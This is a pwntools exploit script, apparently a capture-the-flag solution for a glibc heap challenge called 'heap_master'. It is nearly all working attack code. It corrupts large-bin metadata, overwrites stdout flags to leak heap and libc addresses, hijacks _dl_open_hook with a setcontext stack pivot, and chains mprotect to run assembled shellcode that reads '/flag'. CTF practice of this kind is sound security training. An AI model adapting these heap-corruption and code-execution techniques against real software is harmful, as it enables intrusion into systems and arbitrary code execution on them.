#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="info"
context.arch="amd64"
os.environ = {"LD_LIBRARY_PATH":"./"}
pwn_file="./heap_master"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
heap_add=0
#stack_add=0
r = None
pid = None
def get_cc():
    global r
    global pid
    if len(sys.argv)==1:
        #r=process(pwn_file)
        #pid=r.pid
        r = remote("127.1",60001)
        pid = 0
    else:
        r=remote("pwn.it",3333)
        pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(size):
    r.sendlineafter(">> ","1")
    r.sendlineafter("size: ",str(size))

def free(pc):
    r.sendlineafter(">> ","3")
    r.sendlineafter("offset: ",str(pc))

def edit(pc,f):
    cont = fit(f,filler="\x00")
    r.sendlineafter(">> ","2")
    r.sendlineafter("offset: ",str(pc))
    r.sendlineafter("size: ",str(len(cont)))
    r.sendafter("content: ",cont)

cnt = 0
while True:
    cnt += 1
    print cnt
    get_cc()
    # alloc a large bin
    f={
        0x008:0x421,
        0x428:0x21,
        0x448:0x21,
    }
    edit(0x1000,f)
    free(0x1010)

    f={
        0x008:0x101,
        0x108:0x21,
        0x128:0x21,
    }
    edit(0x500,f)
    free(0x510)
    add(0xf1)
    # edit large bin bk_nextsize
    f={
        0x8:p64(0x101),
        0x108:p64(0x21),
        0x128:p64(0x21),
    }
    edit(0x1010,f)
    free(0x1020)
    add(0xf0)

    # alloc a smaller large bin
    f={
        0x008:0x411,
        0x418:0x21,
        0x438:0x21,
    }
    edit(0x2a10,f)
    free(0x2a20)

    f={
        0x008:0x101,
        0x108:0x21,
        0x128:0x21,
    }
    edit(0x1500,f)
    free(0x1510)

    # overwrite stdout flag 
    # https://code.woboq.org/userspace/glibc/libio/fileops.c.html#1218
    # if f->flag & 0xa00 and f->flag & 0x1000 == 1 then it will leak something when f->write_base != f->write_ptr
    try:
        edit(0x1028,{0:p16(0x5601-0x20)})
        add(0xf1)
        f={
            0x8:0x211,
            0x218:p64(0x21),
            0x238:p64(0x21)
        }
        edit(0x1010,f)
        free(0x1020)
        add(0x100)

        f={
            0x8:p64(0x401),
            0x408:p64(0x21),
            0x428:p64(0x21),
        }
        edit(0x3000,f)
        free(0x3010)
        edit(0x1028,{0:p16(0x5619-0x20)})
        add(0x200)
        data = r.recv(0x8,timeout=1)
        if data == ""or data[0] == "=":
            r.close()
            continue
        else:
            heap_add = (u64(data)>>8)-0x2a18
    except Exception as e:
        r.close()
        continue
    libc.address = u64(r.recv(8)) - 0x39e683 # 0x38b6e0
    f={
        0x8:p64(0x421),
        0x28:p64(libc.sym["_dl_open_hook"]-0x20)
    }
    edit(0x1000,f)
    edit(0x3210,{8:0x401})
    f={
        0:0x400,
        8:0x20,
        0x28:0x21
            }
    edit(0x3210+0x400,f)
    add(0x500)
    # 0x7FD7D: mov     rdi, [rbx+48h]
    #          mov     rsi, r13
    #          call    qword ptr [rbx+40h]
    # 0x43565: mov     rsp, [rdi+0A0h]
    f={
        0:p64(libc.address + 0x7FD7D),
        0x40:p64(libc.address + 0x43565),
        0x48:p64(heap_add + 0x5000)
    }
#    .text:0000000000043565                 mov     rsp, [rdi+0A0h]
#    .text:000000000004356C                 mov     rbx, [rdi+80h]
#    .text:0000000000043573                 mov     rbp, [rdi+78h]
#    .text:0000000000043577                 mov     r12, [rdi+48h]
#    .text:000000000004357B                 mov     r13, [rdi+50h]
#    .text:000000000004357F                 mov     r14, [rdi+58h]
#    .text:0000000000043583                 mov     r15, [rdi+60h]
#    .text:0000000000043587                 mov     rcx, [rdi+0A8h]
#    .text:000000000004358E                 push    rcx
#    .text:000000000004358F                 mov     rsi, [rdi+70h]
#    .text:0000000000043593                 mov     rdx, [rdi+88h]
#    .text:000000000004359A                 mov     rcx, [rdi+98h]
#    .text:00000000000435A1                 mov     r8, [rdi+28h]
#    .text:00000000000435A5                 mov     r9, [rdi+30h]
#    .text:00000000000435A9                 mov     rdi, [rdi+68h]
#    .text:00000000000435AD                 xor     eax, eax
#    .text:00000000000435AF                 retn
    code = """
        xor rsi,rsi
        mov rax,SYS_open
        call here
        .string "/flag"
        here:
        pop rdi
        syscall
        mov rdi,rax
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_read
        syscall
        mov rdi,1
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_write
        syscall
        mov rax,SYS_exit
        syscall
    """

    shellcode = asm(code,arch="amd64")
    rop_f = {
        0xa0:heap_add + 0x5100,
        0xa8:libc.sym["mprotect"],
        0x70:0x10000,
        0x88:0x7,
        0x68:heap_add,
        0x100:heap_add + 0x5108,
        0x108:shellcode
    }
    edit(0x5000,rop_f)

    edit(0x3210,f)
    free(0x10)
    print r.recvline()
    r.interactive()
    break












